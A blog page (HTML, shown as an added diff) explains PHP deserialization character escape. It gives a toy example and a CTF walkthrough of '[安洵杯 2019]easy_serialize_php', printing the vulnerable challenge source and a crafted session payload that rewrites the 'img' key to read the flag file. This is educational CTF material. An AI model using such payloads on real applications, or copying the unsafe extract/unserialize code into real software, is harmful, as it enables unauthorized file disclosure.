@@ -1,0 +1,281 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PHP反序列化字符逃逸 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PHP反序列化字符逃逸 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="问题描述
+代码对序列化后的字符串进行修改，如果修改导致字符串长度发生变化，那么在反序列化的时候可能会产生漏洞。
+举个例子
+&lt;?php
+
+function filter($str)
+{
+    return str_replace('b..." />
+    <meta name="keywords" content="反序列化,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PHP反序列化字符逃逸
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-06-06
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/VdmrICFMJ/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/php-fan-xu-lie-hua-zi-fu-tao-yi.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="问题描述">问题描述</h1>
+<p>代码对序列化后的字符串进行修改，如果修改导致字符串<strong>长度</strong>发生变化，那么在反序列化的时候可能会产生漏洞。</p>
+<h1 id="举个例子">举个例子</h1>
+<pre><code class="language-php">&lt;?php
+
+function filter($str)
+{
+    return str_replace('b', 'cc', $str);
+}
+
+class A
+{
+    public $name = 'user';
+    public $pass = '123456';
+}
+
+$AA = new A();
+echo serialize($AA).&quot;\n&quot;;
+$res = filter(serialize($AA));      # 漏洞点
+
+$c = unserialize($res);
+echo $c-&gt;pass;
+?&gt;
+</code></pre>
+<p>代码会使用filter函数对序列化后的字符串进行修改，将'b'替换为'cc'。这一替换将会对序列化的字符串长度产生影响，进而产生一些意外的错误。</p>
+<p>现在利用这个错误，通过修改A中name的值，间接修改反序列化后pass的值。</p>
+<p>这里所要理解的是，由于序列化字符串中的'b'会被替换为'cc'，长度变长了，而序列化字符串中每一个属性长度的值不会变化，那我们就可以在name输入很多'b'来把构造的字符串“挤”出来。</p>
+<pre><code># 原始序列化的字符串
+O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;}
+
+# 修改name为'buser'，name属性的长度由5-&gt;6，'r'被挤了出来
+O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;ccuser&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;}
+</code></pre>
+<p>利用这个特性，修改<code>$name='bbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;}'</code>，这里我们用27个'b'将后面的<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;}</code>给挤了出来，达到了一种修改pass值的同时提前用 <code>;}</code>闭合序列化字符串的效果。</p>
+<p>这样在经过filter函数处理后，序列化字符串变成了这样：<br>
+<img src="https://skyblu3519.github.io/post-images/1685984837379.png" alt="" loading="lazy"></p>
+<p>而pass也被修改为'hacker'<br>
+<img src="https://skyblu3519.github.io/post-images/1685984989938.png" alt="" loading="lazy"></p>
+<h1 id="安洵杯-2019easy_serialize_php">[安洵杯 2019]easy_serialize_php</h1>
+<p>充满回忆的题，充满回忆的人。</p>
+<p>题目可以直接查看源码</p>
+<pre><code class="language-php">&lt;?php
+
+$function = @$_GET['f'];
+
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';
+    return preg_replace($filter,'',$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION[&quot;user&quot;] = 'guest';
+$_SESSION['function'] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo '&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;';
+}
+
+if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));
+}
+</code></pre>
+<p>通过<code>phpinfo</code>可以知道flag所在文件为<code>d0g3_f1ag.php</code>，而读取的方法则是通过<code>file_get_contents(base64_decode($userinfo['img']))</code>。</p>
+<p>虽然可以通过<code>extract($_POST);</code>修改<code>$_SESSION</code>数组，但是<code>$userinfo['img']</code>显然是无法直接修改的。</p>
+<p>但<code>$_SESSION[&quot;user&quot;]</code>和<code>$_SESSION[&quot;function&quot;]</code>是可控的，结合这里<code>filter</code>会对序列化字符串的修改，所以可以间接修改<code>$_SESSION[&quot;img&quot;]</code>。</p>
+<p>虽然这里不像之前的例子中可以修改一个属性的值来挤出一个属性，但可以修改两个属性，用前面的属性吞掉后面的一部分。构造的方法：</p>
+<pre><code>$_SESSION[&quot;user&quot;] = 'fl1gfl1gfl1gfl1gfl1gphp';
+$_SESSION['function'] = '&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;1&quot;;}';
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1685986415791.png" alt="" loading="lazy"></figure>
+<p>可以控制读取文件后，后面flag自然就可以读到了。</p>
+<p>ps.<code>extract</code>修改数组的方式：<code>_SESSION[user]=xxxxxxx</code></p>
+<h1 id="参考链接">参考链接</h1>
+<p>https://blog.csdn.net/qq_45521281/article/details/107135706</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E9%97%AE%E9%A2%98%E6%8F%8F%E8%BF%B0">问题描述</a></li>
+<li><a href="#%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90">举个例子</a></li>
+<li><a href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019easy_serialize_php">[安洵杯 2019]easy_serialize_php</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/auto-gpt-qian-xi-wu-lai-ban/">
+              <h3 class="post-title">
+                Auto-GPT浅析（无赖版）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
